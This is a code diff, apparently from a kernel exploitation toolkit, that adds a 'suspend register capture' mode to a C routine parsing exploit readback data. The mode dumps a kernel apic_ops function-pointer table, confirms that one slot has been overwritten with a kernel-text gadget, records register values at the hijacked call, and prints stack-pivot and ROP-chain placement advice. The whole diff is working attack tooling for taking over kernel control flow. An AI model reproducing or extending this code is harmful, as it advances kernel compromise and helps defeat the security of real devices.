@@ -962,6 +962,161 @@ static void _kldload(void* data, size_t data_size)
         }
 
         printf("\n=== END DMAP PIVOT SCAN ===\n");
+    } else if (magic == 0x53524350) { /* "SRCP" - suspend register capture */
+        uint32_t status = (uint32_t)(readback[0] >> 32);
+        uint32_t call_count = ((uint32_t*)&readback[5])[0];
+        uint32_t hooked_slot = ((uint32_t*)&readback[5])[1];
+        uint64_t ktext = readback[2];
+        uint64_t kdata = readback[1];
+        uint64_t apic_addr = readback[3];
+
+        static const char* rnames[] = {
+            "RAX", "RBX", "RCX", "RDX", "RSI", "RDI", "RBP", "R8 ",
+            "R9 ", "R10", "R11", "R12", "R13", "R14", "R15", "RSP", "FLG"
+        };
+
+        static const char* slot_names[] = {
+            "create", "init", "xapic_mode", "is_x2apic",
+            "setup", "dump", "disable", "set_id",
+            "ipi_raw", "ipi_vectored", "ipi_wait", "ipi_alloc",
+            "ipi_free", "set_lvt_mask", "set_lvt_mode", "set_lvt_polarity",
+            "set_lvt_triggermode", "lvt_eoi_clear", "set_tpr", "get_timer_freq",
+            "timer_enable_intr", "timer_disable_intr", "timer_set_divisor",
+            "timer_initial_count", "timer_current_count", "self_ipi",
+            "slot26", "slot27"
+        };
+
+        printf("\n=== SUSPEND REGISTER CAPTURE ===\n");
+        printf("  status:        %s\n",
+               status == 1 ? "ARMED FOR SUSPEND" :
+               status == 0xAAAA ? "CAPTURING..." :
+               status == 0xFF ? "ERROR" : "unknown");
+        printf("  kdata_base:    %#lx\n", kdata);
+        printf("  ktext_base:    %#lx\n", ktext);
+        printf("  apic_ops @:    %#lx\n", apic_addr);
+        printf("  orig xapic:    %#lx (ktext+%#lx)\n", readback[4], readback[4] - ktext);
+        printf("  nop_ret:       %#lx (ktext+%#lx)\n", readback[34], readback[34] - ktext);
+        printf("  capture_stub:  %#lx\n", readback[35]);
+        printf("  captures:      %u (hooked slot %u = %s)\n", call_count,
+               hooked_slot, hooked_slot < 28 ? slot_names[hooked_slot] : "?");
+
+        /* Show apic_ops table dump */
+        printf("\n  --- apic_ops table dump ---\n");
+        for (int i = 0; i < 28; i++) {
+            uint64_t ptr = readback[6 + i];
+            if (ptr == 0) continue;
+            printf("  [%2d] %-22s %#lx (ktext+%#lx)\n",
+                   i, slot_names[i], ptr, ptr - ktext);
+        }
+
+        /* Register captures */
+        for (uint32_t c = 0; c < call_count && c < 4; c++) {
+            printf("\n  --- Capture %u (registers at apic_ops[%u] entry) ---\n",
+                   c, hooked_slot);
+            for (int i = 0; i < 17; i++) {
+                uint64_t val = readback[36 + c * 17 + i];
+                const char* note = "";
+                if (i == 16) {
+                    printf("    %s: %#018lx\n", rnames[i], val);
+                    continue;
+                }
+                if (val == apic_addr)
+                    note = " <-- apic_ops table! PIVOT CANDIDATE";
+                else if (val >= apic_addr && val <= apic_addr + 0xE0)
+                    note = " <-- inside apic_ops! PIVOT CANDIDATE";
+                else if (val >= ktext && val < kdata)
+                    note = " [ktext]";
+                else if (val >= kdata && val < kdata + 0x10000000)
+                    note = " [kdata]";
+                else if ((val >> 40) == 0xffffff)
+                    note = " [kern_heap]";
+                else if ((val >> 40) == 0xffffd7 || (val >> 40) == 0xffffe0 ||
+                         (val >> 40) == 0xffff80 || (val >> 40) == 0xffffee)
+                    note = " [dmap/kernel]";
+                printf("    %s: %#018lx%s\n", rnames[i], val, note);
+            }
+        }
+
+        /* Stability analysis across captures */
+        if (call_count >= 2) {
+            printf("\n  --- Stability Analysis (across %u captures) ---\n", call_count);
+            for (int i = 0; i < 16; i++) {
+                int stable = 1;
+                uint64_t first = readback[36 + i];
+                for (uint32_t c = 1; c < call_count && c < 4; c++) {
+                    if (readback[36 + c * 17 + i] != first) {
+                        stable = 0;
+                        break;
+                    }
+                }
+                if (stable && first != 0)
+                    printf("    %s: STABLE at %#018lx%s\n", rnames[i], first,
+                           (first == apic_addr || (first >= apic_addr && first <= apic_addr + 0xE0))
+                           ? " *** PIVOT TARGET ***" : "");
+            }
+        }
+
+        /* Suspend arming status */
+        printf("\n  --- Suspend Arming ---\n");
+        printf("  apic_ops[2] armed: %#lx\n", readback[122]);
+        printf("  apic_ops[2] readback: %#lx %s\n", readback[123],
+               readback[122] == readback[123] ? "[WRITE OK]" : "[WRITE FAILED]");
+        printf("  sentinel: %#lx %s\n", readback[104],
+               readback[104] == 0xdeadbeefcafe0005ULL ? "[OK]" : "[MISSING]");
+
+        /* Kdata markers for post-resume check */
+        printf("\n  kdata markers (check after resume):\n");
+        int markers_ok = 1;
+        for (int i = 0; i < 16; i++) {
+            uint64_t expected = 0xDEAD000000000000ULL | (uint64_t)(i + 1);
+            uint64_t actual = readback[105 + i];
+            if (actual != expected) markers_ok = 0;
+        }
+        printf("    marker integrity: %s\n", markers_ok ? "ALL OK" : "MISMATCH");
+        printf("    second sentinel: %#lx %s\n", readback[121],
+               readback[121] == 0xfeedface00000005ULL ? "[OK]" : "[MISSING]");
+
+        if (status == 1) {
+            printf("\n  >>> apic_ops[2] ARMED with nop_ret (ktext) <<<\n");
+            printf("  >>> Enter rest mode now to test suspend! <<<\n");
+            printf("  >>> After resume: run KTST restore (fw_ver=3) to clean up <<<\n");
+        }
+
+        /* Pivot recommendation based on register analysis */
+        if (call_count > 0) {
+            printf("\n  --- Pivot Recommendation ---\n");
+            int found_pivot = 0;
+            for (int i = 0; i < 16; i++) {
+                uint64_t val = readback[36 + i];
+                if (val == apic_addr || (val >= apic_addr && val <= apic_addr + 0xE0)) {
+                    int stable = 1;
+                    for (uint32_t c = 1; c < call_count && c < 4; c++) {
+                        if (readback[36 + c * 17 + i] != val) {
+                            stable = 0;
+                            break;
+                        }
+                    }
+                    if (stable || call_count == 1) {
+                        printf("    %s = %#lx (apic_ops%+ld)\n",
+                               rnames[i], val, (long)(val - apic_addr));
+                        printf("    => Need: xchg rsp, %s; ret  (or equivalent pivot)\n",
+                               i == 0 ? "rax" : i == 1 ? "rbx" : i == 2 ? "rcx" :
+                               i == 3 ? "rdx" : i == 4 ? "rsi" : i == 5 ? "rdi" :
+                               i == 6 ? "rbp" : i == 7 ? "r8"  : i == 8 ? "r9"  :
+                               i == 9 ? "r10" : i == 10 ? "r11" : i == 11 ? "r12" :
+                               i == 12 ? "r13" : i == 13 ? "r14" : "r15");
+                        printf("    => ROP chain goes at apic_ops+offset as function pointers\n");
+                        found_pivot = 1;
+                    }
+                }
+            }
+            if (!found_pivot) {
+                printf("    No register holds apic_ops pointer.\n");
+                printf("    Look for registers with kdata/heap pointers for alternative pivots.\n");
+            }
+        }
+
+        printf("\n=== END SUSPEND REGISTER CAPTURE ===\n");
     } else if (magic == 0x4B545354) { /* "KTST" - ktext redirect test */
         uint32_t mode = (uint32_t)(readback[0] >> 32);
         uint64_t ktext = readback[2];
